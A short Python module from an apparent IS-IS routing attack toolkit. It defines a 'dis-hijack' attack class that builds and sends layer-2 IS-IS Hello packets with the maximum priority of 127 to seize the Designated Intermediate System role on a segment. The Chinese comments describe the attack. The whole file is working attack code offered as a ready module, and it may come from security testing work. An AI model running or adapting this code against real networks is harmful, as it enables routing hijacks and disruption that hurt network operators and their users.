from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import IIHConfig
from isis_attack.core.packet import build_iih_packet
from isis_attack.network.sender import PacketSender
from isis_attack.network.adapter import get_local_mac


class DISHijackAttack(BaseAttack):
    name = "dis-hijack"
    description = "发送 Priority=127 的 IIH 抢占 DIS 角色"
    category = AttackCategory.ADJACENCY
    config: IIHConfig

    def setup(self) -> None:
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        pkt = build_iih_packet(
            sys_id=self.config.sys_id,
            area_addr=self.config.area_addr,
            src_mac=self._src_mac,
            level=self.config.level,
            priority=127,
            hold_timer=self.config.hold_timer,
            hello_interval=self.config.hello_interval,
        )
        ok = self._sender.send_l2(pkt)
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"DIS 抢占: Priority=127, System ID={self.config.sys_id}",
        )

